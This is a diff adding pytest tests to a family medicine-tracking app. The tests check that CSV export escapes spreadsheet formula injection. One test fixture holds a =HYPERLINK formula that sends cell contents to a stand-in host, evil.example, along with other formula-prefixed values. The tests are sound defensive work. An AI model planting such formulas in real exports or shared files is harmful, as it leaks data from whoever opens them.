@@ -1,3 +1,5 @@
+import csv
+import io
 from urllib.parse import unquote
 
 from tests.conftest import register
@@ -113,3 +115,25 @@ def test_export_empty_cabinet(client, owner):
     r = client.get(f"/api/families/{f}/export.txt", headers=h)
     assert r.status_code == 200 and r.text == ""
     assert "attachment" in r.headers["content-disposition"]
+
+
+def test_csv_export_neutralises_spreadsheet_formulas(client, owner):
+    """Название или заметку пишет любой человек семьи: «=HYPERLINK(...)» не должно выполниться в Excel у того, кто откроет выгрузку."""
+    h, _, f = owner
+    client.post(f"/api/families/{f}/medicines", headers=h, json={
+        "name": "=HYPERLINK(\"http://evil.example/?x=\"&A1,\"клик\")", "notes": "+1+1", "manufacturer": "@SUM(1)", "form": "-2+3",
+        "packages": [{"quantity": 2, "location": "=A1"}]})
+    r = client.get(f"/api/families/{f}/export.csv", headers=h)
+    assert r.status_code == 200
+    rows = list(csv.reader(io.StringIO(r.text.lstrip("\ufeff"))))
+    cells = [c for row in rows[1:] for c in row if c]
+    assert cells and not any(c.startswith(("=", "+", "-", "@")) for c in cells)
+    assert "'=HYPERLINK" in r.text and "'+1+1" in r.text and "'@SUM(1)" in r.text
+    assert "2" in rows[1] or "2.0" in rows[1]  # числа остаются числами: апостроф только у текста
+
+
+def test_csv_export_keeps_ordinary_text_untouched(client, owner):
+    h, _, f = owner
+    client.post(f"/api/families/{f}/medicines", headers=h, json={"name": "Нурофен", "dosage": "200 мг", "notes": "после еды", "packages": [{"quantity": 5}]})
+    rows = list(csv.reader(io.StringIO(client.get(f"/api/families/{f}/export.csv", headers=h).text.lstrip("\ufeff"))))
+    assert rows[1][0] == "Нурофен" and rows[1][2] == "200 мг" and rows[1][7] == "после еды"
